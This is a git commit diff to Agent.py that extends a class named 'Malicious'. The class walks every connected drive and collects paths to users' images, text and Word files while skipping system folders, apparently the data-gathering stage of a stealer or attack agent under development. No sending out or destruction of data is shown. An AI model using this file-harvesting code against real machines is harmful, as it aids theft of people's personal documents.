90ae99bf6092ab23632d709607f82585b67a72cc
rawrmonster17 <108893772+rawrmonster17@users.noreply.github.com>
2022-12-06 22:35:36 -0600

    Update Agent.py
    Pushing changes for the night

--- Agent.py
+++ Agent.py
@@ -8,6 +8,8 @@ class Logging:
         self.logfile_location = None
     
     def set_logging_location(self):
+        # For this function I want it to be able to be to check size of log location left, and be able to log rotate. Maybe not all in this
+        # function but defently in this class
         pass
 
 class Health:
@@ -23,38 +25,30 @@ class Malicious:
 
     def __init__(self) -> None:
         self.list_of_all_connected_drives = []
-        self.important_file_extensions = [".jpg", ".txt"]
-        self.folders_to_exclude_in_data_collection = [r"c:\Windows\*", r"c:\Users\*\AppData\*"]
+        self.important_file_extensions = [".jpg", ".txt", ".docx", ".png"]
+        self.folders_to_exclude_in_data_collection = [r"c:\Windows\*", r"c:\Users\*\AppData\*", r"c:\Program Files\*", r"c:\Program Files (x86)\*", r"c:\ProgramData\*", \
+            r"c:\Users\Public\*"]
         self.files_to_collect = []
 
-    def find_all_important_files(self):
-        # This works but I need to filter some files so it will not pull files from c:\windows and file paths like that. 
+    def find_all_important_files(self): 
         for drive in self.list_of_all_connected_drives:
             for root, dirs, files in os.walk(drive):
                 for file in files:
                     for file_extension in self.important_file_extensions:
                         if (file.endswith(file_extension)):
                             full_file_path = os.path.join(root, file)
-                            print(full_file_path)
                             iteration_count = 0
                             iteration_max = len(self.folders_to_exclude_in_data_collection)
-                            # This does not work correctly
                             for folder_to_exclude in self.folders_to_exclude_in_data_collection:
                                 iteration_count = iteration_count + 1
                                 if fnmatch.fnmatch(full_file_path, folder_to_exclude):
-                                    print("{} Matches and is going to be excluded".format(full_file_path))
                                     break
                                 elif not fnmatch.fnmatch(full_file_path, folder_to_exclude) and iteration_count == iteration_max:
-                                    print("adding file to list")
                                     self.files_to_collect.append(full_file_path)
                                 elif not fnmatch.fnmatch(full_file_path, folder_to_exclude) and iteration_count != iteration_max:
                                     continue
                                 else:
-                                    print("")
-                                
-                                                  
-        for item in self.files_to_collect:
-            print("\n {} \n".format(item))
+                                    print("I am not sure what happened here. But I am going to creat a logging function to handle stuff like this")                          
 
     def find_all_connected_drives(self):
         all_lower_case_letters_list = list(string.ascii_lowercase)
